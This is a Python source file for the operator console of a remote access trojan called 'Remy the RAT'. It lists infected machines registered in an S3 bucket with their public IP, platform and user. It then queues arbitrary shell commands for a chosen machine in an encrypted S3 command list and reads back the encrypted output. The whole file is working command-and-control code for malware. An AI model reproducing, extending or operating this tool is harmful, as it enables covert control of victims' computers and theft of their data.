#!/usr/bin/python3

import argparse
import json
import os.path
import tempfile
import time
from datetime import datetime
from uuid import uuid4
import boto3
from boto3.s3.transfer import S3Transfer
from botocore.exceptions import ClientError
import subprocess
from colorama import Fore, Back, Style, init
import emoji

def parse_args():
    parser = argparse.ArgumentParser(prog="Remy the RAT", description="Remy the RAT manager's CLI")
    parser.add_argument("--commands-list-decryption-private-key-file",
                        help="This parameter sets the PEM file to use as the private key to read the commands list file")
    parser.add_argument("--commands-list-encryption-public-key-file",
                        help="This parameter sets the PEM file to use as the public key to write commands to the commands list file")
    parser.add_argument("--commands-outputs-decryption-private-key-file",
                        help="This parameter sets the PEM file to use as the private key to read commands outputs")
    parser.add_argument("--commands-s3-bucket-name",
                        help="This parameter sets the S3 bucket name used for storing the commands")
    parser.add_argument("--outputs-s3-bucket-name",
                        help="This parameter sets the S3 bucket name used for storing the commands' outputs")
    parser.add_argument("--mode", choices=["aws-s3"],
                        help="This parameter sets the type of the backend storage used for storing the RAT's commands list")
    args = parser.parse_args()
    if args.mode == "aws-s3":
        if args.commands_s3_bucket_name is None:
            print("ERROR: --commands-s3-bucket-name is required when --mode is aws-s3.")
            exit(9)
        if args.outputs_s3_bucket_name is None:
            print("ERROR: --outputs-s3-bucket-name is required when --mode is aws-s3.")
            exit(9)

    return args


def test_sts_get_caller_identity():
    try:
        sts_client = boto3.client('sts')
        response = sts_client.get_caller_identity()
        if not 'Account' in response or not response['Account']:
            print(
                "ERROR: AWS connectivity is not working properly. Try to run `aws sts get-caller-identity` and follow the instructions on the screen to fix it")
            exit(8)
    except Exception as ex:
        print(
            f"ERROR: AWS connectivity is not working properly ({str(ex)}). Try to run `aws sts get-caller-identity` and follow the instructions on the screen to fix it")
        exit(8)


def get_s3_files(bucket_name, prefix="registrations", filename=None, file_extension=".5ae9c92eaf5011efb98f83b6693403d8"):
    # Initialize a boto3 S3 client
    s3_client = boto3.client('s3')

    # List objects under the "registrations" folder (prefix)
    response = s3_client.list_objects_v2(Bucket=bucket_name, Prefix=prefix)

    files_dict = {}

    # Check if there are objects in the response
    if 'Contents' in response:
        for obj in response['Contents']:
            file_key = obj['Key']

            # Check if the file has the specified extension
            if (filename is not None and file_key == filename) or (filename is None and file_key.endswith(file_extension)):
                # Get the file name without the extension
                file_name_without_extension = file_key.split('/')[-1].replace(file_extension, '')

                # Download the file content
                file_obj = s3_client.get_object(Bucket=bucket_name, Key=file_key)
                file_content = file_obj['Body'].read()
                decoded_file_contents = file_content.decode('utf-8')

                # Add the file name and content to the dictionary
                try:
                    files_dict[file_name_without_extension] = json.loads(decoded_file_contents)
                except:
                    files_dict[file_name_without_extension] = decoded_file_contents

    return files_dict

def download_commands_file_from_s3_bucket(commands_s3_bucket_filename, commands_s3_bucket_name, tmp_dir):
    file_found = False
    s3 = boto3.client('s3')
    try:
        s3.head_object(Bucket=commands_s3_bucket_name, Key=commands_s3_bucket_filename)
    except ClientError as e:
        if e.response['Error']['Code'] == '404':
            with open(os.path.join(tmp_dir, commands_s3_bucket_filename), "w") as commands_s3_bucket_file:
                commands_s3_bucket_file.write("[]")
                return file_found
        else:
            print(
                f"ERROR: Failed to download the commands list file ({commands_s3_bucket_filename}) from the commands bucket ({commands_s3_bucket_name}) to a temporary location ({tmp_dir}) due to an exception ({str(e)}). Cannot continue")
            exit(7)

    try:
        s3.download_file(commands_s3_bucket_name, commands_s3_bucket_filename, os.path.join(tmp_dir, commands_s3_bucket_filename))
        if not os.path.isfile(os.path.join(tmp_dir, commands_s3_bucket_filename)):
            print(
                f"ERROR: Failed to download the commands list file ({commands_s3_bucket_filename}) from the commands bucket ({commands_s3_bucket_name}) to a temporary location ({tmp_dir}). Cannot continue")
            exit(7)
        else:
            file_found = True
    except Exception as ex:
        print(
            f"ERROR: Failed to download the commands list file ({commands_s3_bucket_filename}) from the commands bucket ({commands_s3_bucket_name}) to a temporary location ({tmp_dir}) due to an exception ({str(ex)}). Cannot continue")
        exit(7)
    return file_found

def decrypt_commands_file(commands_s3_bucket_filename, commands_list_decryption_private_key_file, tmp_dir):
    try:
        decryptor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decryptor.py")
        rc = subprocess.run([decryptor_path, os.path.join(tmp_dir, commands_s3_bucket_filename),
                             commands_list_decryption_private_key_file], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
        if rc.returncode != 0:
            print(
                f"ERROR: Failed to decrypt the commands list. Return code from decryptor.py is not zero ({rc.returncode}). Cannot continue")
            exit(6)
        else:
            file_data = json.dumps(json.loads(rc.stdout.decode()))
    except Exception as ex:
        print(f"ERROR: Failed to decrypt the commands list due to the following exception: {str(ex)}")
        exit(6)

    return file_data

def decrypt_command_output(encrypted_command_output, command_output_decryption_private_key_file, tmp_dir):
    tmp_filename = tempfile.mktemp()
    try:
        with open(tmp_filename, "w") as tmp_file:
            tmp_file.write(encrypted_command_output)
        decryptor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decryptor.py")
        rc = subprocess.run([decryptor_path, os.path.join(tmp_dir, tmp_filename),
                             command_output_decryption_private_key_file], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
        if rc.returncode != 0:
            print(
                f"ERROR: Failed to decrypt the commands output. Return code from decryptor.py is not zero ({rc.returncode}). Cannot continue")
            exit(6)
        else:
            file_data = json.dumps(json.loads(rc.stdout.decode()))
    except Exception as ex:
        print(f"ERROR: Failed to decrypt the commands output due to the following exception: {str(ex)}")
        exit(6)
    finally:
        os.remove(tmp_filename)

    return file_data

def encrypt_commands_file(decrypted_filename, commands_list_encryption_public_key_file):
    try:
        encryptor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "encryptor.py")
        rc = subprocess.run([encryptor_path, decrypted_filename, commands_list_encryption_public_key_file],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if rc.returncode != 0:
            print(
                f"ERROR: Failed to re-encrypt the commands file. Return code from encryptor.py is not zero ({rc.returncode}). Cannot continue")
            exit(7)
        else:
            re_encrypted_filename = os.path.splitext(decrypted_filename)[0]
            if not os.path.isfile(re_encrypted_filename):
                print(
                    f"ERROR: Failed to re-encrypt the commands file. The encrypted file was not found. Cannot continue")
                exit(7)
    except Exception as ex:
        print(
            f"ERROR: Failed to re-encrypt the commands file due to the following exception: {str(ex)}. Cannot continue")
        exit(7)
    return re_encrypted_filename

def progress_callback(bytes_transferred):
    print(Fore.LIGHTBLACK_EX + emoji.emojize(":watch:") + f" Transferred {bytes_transferred} bytes to the commands S3 bucket" + Fore.RESET)

def upload_commands_file_to_s3_bucket(re_encrypted_filename, commands_s3_bucket_name):
    try:
        s3 = boto3.client('s3')
        target_filename = os.path.basename(re_encrypted_filename)
        transfer = S3Transfer(s3)
        print(Fore.LIGHTBLACK_EX + emoji.emojize(":watch:") + f" Uploading commands file {re_encrypted_filename} to s3://{commands_s3_bucket_name}/{target_filename}..." + Fore.RESET)
        transfer.upload_file(re_encrypted_filename, commands_s3_bucket_name, target_filename, callback=progress_callback)
    except Exception as ex:
        print(
            f"ERROR: Failed to upload the re-encrypted file {re_encrypted_filename} to the S3 bucket {commands_s3_bucket_name} due to the following exception: {str(ex)}. Cannot continue")
        exit(6)

def replace_character_at_index(original_string, index, new_character):
    """
    Replaces a character in a string at the specified index with a new character.

    :param original_string: The original string (str)
    :param index: The index of the character to replace (int)
    :param new_character: The new character to insert (str, length 1)
    :return: A new string with the character replaced
    """
    if not isinstance(original_string, str):
        raise ValueError("The 'original_string' parameter must be a string.")
    if not isinstance(new_character, str) or len(new_character) != 1:
        raise ValueError("The 'new_character' parameter must be a single character string.")
    if not (0 <= index < len(original_string)):
        raise IndexError("Index out of range.")

    # Create a new string with the character replaced
    return original_string[:index] + new_character + original_string[index + 1:]

def create_decrypted_commands_file(args, commands_filename, file_found_on_s3, tmp_dir):
    if file_found_on_s3:
        decrypted_file_contents = decrypt_commands_file(commands_filename,
                                                        args.commands_list_decryption_private_key_file, tmp_dir)
    else:
        decrypted_file_contents = "[]"
    decrypted_filename = os.path.join(tmp_dir, commands_filename + ".json")
    with open(decrypted_filename, "w") as commands_file:
        commands_file.write(decrypted_file_contents)
    return decrypted_filename

def main():
    print(emoji.emojize(":drum:") +  " Setting up...")
    args = parse_args()
    tmp_dir = "/tmp/remy-master"
    os.makedirs(tmp_dir, exist_ok=True)
    if args.mode == "aws-s3":
        print(emoji.emojize(":rat:") + " Testing AWS S3 connectivity...")
        test_sts_get_caller_identity()
        registered_rats = get_s3_files(args.commands_s3_bucket_name)
        if len(registered_rats.keys()) > 0:
            registered_rat_id = registered_rats[list(registered_rats.keys())[0]]["my_id"]
            commands_filename = registered_rat_id + "-cmds"
            file_found_on_s3 = download_commands_file_from_s3_bucket(commands_filename, args.commands_s3_bucket_name, tmp_dir)
            decrypted_filename = create_decrypted_commands_file(args, commands_filename, file_found_on_s3, tmp_dir)
            re_encrypted_filename = encrypt_commands_file(decrypted_filename, args.commands_list_encryption_public_key_file)
            upload_commands_file_to_s3_bucket(re_encrypted_filename, args.commands_s3_bucket_name)
        print(emoji.emojize(":thumbs_up:") + " Test successful. Proceeding...")
        report_results_to_url = f"https://{args.outputs_s3_bucket_name}.s3.amazonaws.com"
    else:
        print(f"Unknown mode {args.mode}. LEAVING")
        exit(9)

    print('''
....................................................................................................
....................................................................................................
....................................................................................................
............................... .^^:. .......................... ..:::..............................
...............................5&&&#J~.  ..   ....:::...   ... .~JB&&&B^ ...........................
..............................YB@@@@&!7!. .^7YY7~~~~~!7JY7^. .!~7@@@@@#P: ..........................
............................ ^?.Y&&@@B.:5JJ?^..        .:~?JJJ:.B@@@@5.~7 ..........................
............................ ^Y ^5&@@@Y7P!....  ..  .   ....?57Y@@@&5^ !! ..........................
............................. ??^JG&@@&&P!:.......  ... ...:7G&&@@&GJ^~Y............................
.............................. 7G5B&@@&5^  .. .:.....:: ... .~P@@@&B5P?  ...........................
............................  ^7^:7G@&7.~JJ:.:. .:..:. ::.~Y?:.?&@B?^:7!. ..........................
............................^J!..:?&&^.~B@BGPJY:~~::~^^5YGG#@5:.~&@Y^..~Y~..........................
...........................?P:.:.:#&^.^.7&G5@&&J:    :Y&@@J##~:^.~#&~.:..55: .......................
..........................7Y. .. JP. :. ^?PPP~!:      ^^!GGP?: :. .5P .:  ?Y. ......................
.........................5G^  ..?#:.......:5J..       ...Y5:.. .....GP... .YB:......................
.............. ........ !PJ^....B&::!?7~^~J?7J.   ..   :?!?J::^7J!^.P&^....7PP....::................
.......~??7??J7. ..... !PPJ:..:.B@Y?5PPJ?B7::^:.. .....:^:.YG7YPGGYY&&:....~PP5 ....................
.....!57:.....?G: ... ^#P#~....:P&BB####&J.:: :5:.  .~5..::.P&#&##BG#G~^:..^PBGY ...................
....~5. ...... 5P. ...BP&G:.:^^.!@##&&&&&Y::. .#&&##&&5  :^:5&&&&&#B&!.:::^.?&G&: ..................
....!7 ...... :YG. . ^&B@5.   .:?B&##&##&&Y~~:.:P@@@&Y:.:^!P&&#&&&&&#?^:.  .^&&&5 ..................
.....!...... :J?? .. J@&@7:.:~^.YB&##&@&##&@&BGB#BBGB#BG##@&&&&&###&B5:^~^..~G@&#...................
............!7~Y. . :#@@&!!~:. .75#@@&B#@@@@&&YYBBJJ#GJ5#&@@@&BB&@&#5?.  :~~!5@@@! .................
......... :?~!J. . ~Y5@@#?7: .::75#&##@@@&&&@@&B55PPYP#@@@&&&&@&##&#PJ^^.  ^?5@@#J?. ...............
.........~7^77. . !J.^&@@P?. :. !J5B&@@@@@#B#&@@@@@@@@@&&BB&@@@@@&BPJ7..^. ~Y#@@J:~Y................
........?!.7~ ....Y...5@@#Y::.  .!~B&@@@@@@@&&&&&&@&&&&&#&@@@@@@@&&~~:   ^:!P&@&^..?^ ..............
......:J^.Y^ ....5! ..Y&@@Y!:^: .:7JB&@@@@&&@@@@&&@@&&&@@@&&@@@@@G5~^. .^^~7B@&#~...G:..............
.....^Y:.J^ ....:#. .~Y&&@P7~7!.:.!?GB@@&&@&&&@@@@@@@@@@&#&@@&@@BB??.:..7!~J&@&P!:. Y? .............
....:Y::Y^ .... ^B. .?Y&&@#5?YJ.. :YP#&@&#@@@&&&@@@@@@&#&@@@#&@@#P5!...~57?G@@&PJ^..?Y .............
....5^.7! ..... ~#~:~JPB&@@#GPG~ .^?P#@@#B#@@@&#&&@@&&#&@@@&B#@@#GJ!: .5GGB&@@BG57!^JB .............
...7?.^Y ...... :&5?JPG##&@@B&&G..7?GG@&BG#@#&@@@@@@@@@@&#@#GB&@GG5?: ?&&#B@@&#BPPYYBG .............
...P:.7! ........G&GP#B#&&@@5P@@B.^YP&G&#JB@&#&@@@@@@@&&&&@GY#&B&BY7.J&@#7&@@&##BBP#&? .............
...G::7! ....... :&@##&&&&@@&75GP5:!5G@##5B@@@@@@@@@@@@@@@@PG##@B5?:?GYP!G@@@&&&&##@P ..............
...B!:^Y ........ 7G@@@@&&@@@@5?~^^.^YB&&PP@@@@@@@@@@@@@@@@5P&&B57.:::7?#@@@@&@@@@&Y: ..............
...G#!.J?  ....... .G@@@@@@@@@@BJJ~  :JG##G@@@@@@@@@@@@@@@@G#&BY~. ^7?5&@@@@@@@@@@7 ................
...:&B!.7Y:. ...... .J@@@@@@@@@@&GP?. :5GB&@@@@@@@@@@@@@@@@&BGY^ .7P5B@@@@&@@@@@&! .................
... ^##Y!^!7~..       :Y#&&@@@@@@@#Y7^:~PP&@@@@@@@@@@@@@@@@&55~^^7JG@@@@@@@@@&BJ. ..................
.... .5&#57!!~7!^:..    .75&@@@@@@@#~...~Y&@@@@@@@@@@@@@@@@#Y!:..^5@@@@@@@@#Y~.  ...................
...... :5#&&PJY~?5~7?~7~^~^?P#@&&@@@B^ .:^G@@@@@@@@@@@@@@@@G^^. :Y@@@&&@#7^.   .....................
.......  .~5#&&#&#GGY?P?YPJPPB@@@@@@@7~!^^J@@@@@@@@@@@@@@@@Y~^~!~&@@@@&!         ...................
..........  .:~?5G##&&&&@&&&@@@@@@@@@B?^::?&#&&@@@@@@@@&&B&Y^::7P@@@@@@BY7~^^~^^:.   ...............
............   .^!?!?Y77Y55GB#&@&&##G!^:!!7#7:~~::::::^~:~#?~7::~5##&&@@&#BG5????!!J7~:    .........
.:^^^^^^^!!!~!YPBBGGBPP5G&&&&@&5?:5J:~~&Y^!&G5YYPPPPPP5YPG#7^7@7^^~G^~YB@&&&&PPGBBBBBBGY!!~~~~?^^^^.
............::::::^~^^~~~~~^~P?JY?B5YYY55J55P5YJP55YYPJ5PPY5J5P5YPJBYYY75?~~~!~~~~~~~^^^^::.........
........................  .. .  ...^.....:.................:^. ...^...  .... .......................
''')
    print()
    print("Remy the Rat is at your service! (Write #quit, #bye or #exit to quit. Any other command will be executed on your RATs cluster)")
    print("Available RATs:")
    for registered_rat_id in registered_rats.keys():
        registered_rat = registered_rats[registered_rat_id]
        print(registered_rat["my_id"] + "\t" + datetime.fromtimestamp(registered_rat["time_registered"]).isoformat() + "\t" + registered_rat["my_pub_ip"] + "\t" + registered_rat["platform"] + "\t" + registered_rat["user"])
    print()
    rat_id = input("Which RAT would you like to control now (enter its UUID): ")
    commands_filename = rat_id + "-cmds"
    last_command = ""
    last_command_return_code = 0
    while last_command.lower() not in ["#quit", "#bye", "#exit"]:
        if last_command_return_code == 0:
            print(Fore.GREEN + "remy_the_rat>" + Fore.RESET + " ", end="")
        else:
            print(Fore.RED + "remy_the_rat>" + Fore.RESET + " ", end="")
        cur_command = input()
        command_id = str(uuid4())
        if not cur_command.startswith("#"):
            file_found_on_s3 = download_commands_file_from_s3_bucket(commands_filename, args.commands_s3_bucket_name, tmp_dir)
            decrypted_filename = create_decrypted_commands_file(args, commands_filename, file_found_on_s3, tmp_dir)
            commands_queue = []
            with open(decrypted_filename) as commands_file:
                commands_queue = json.loads(commands_file.read())
            commands_queue.append({
                "id": command_id,
                "workdir": "/",
                "platform": "Linux",
                "command": cur_command,
                "report_results_to": report_results_to_url
            })
            with open(decrypted_filename, "w") as commands_file:
                commands_file.write(json.dumps(commands_queue))
            re_encrypted_filename = encrypt_commands_file(decrypted_filename, args.commands_list_encryption_public_key_file)
            upload_commands_file_to_s3_bucket(re_encrypted_filename, args.commands_s3_bucket_name)
            base_progress_bar_string = "." * 12
            progress_bar_index = 0
            progress_bar_string = replace_character_at_index(base_progress_bar_string, 0, "#")
            print(progress_bar_string, end="")
            command_res = get_s3_files(bucket_name=args.outputs_s3_bucket_name, prefix="", filename=rat_id + "=" + command_id + ".98909256ab4211ef92504355150642b7", file_extension=".98909256ab4211ef92504355150642b7")
            while len(command_res.keys()) == 0:
                command_res = get_s3_files(bucket_name=args.outputs_s3_bucket_name, prefix="", filename=rat_id + "=" + command_id + ".98909256ab4211ef92504355150642b7", file_extension=".98909256ab4211ef92504355150642b7")
                time.sleep(1)
                progress_bar_index += 1
                if progress_bar_index > 11:
                    progress_bar_index = 0
                progress_bar_string = replace_character_at_index(base_progress_bar_string, progress_bar_index, "#")
                print("\r" + progress_bar_string, end="")
            decrypted_command_output = decrypt_command_output(command_res[rat_id + "=" + command_id], args.commands_outputs_decryption_private_key_file, tmp_dir)
            print("\r" + decrypted_command_output)
            command_res_obj = json.loads(decrypted_command_output)
            last_command_return_code = int(command_res_obj["exit_code"])


        last_command = cur_command


main()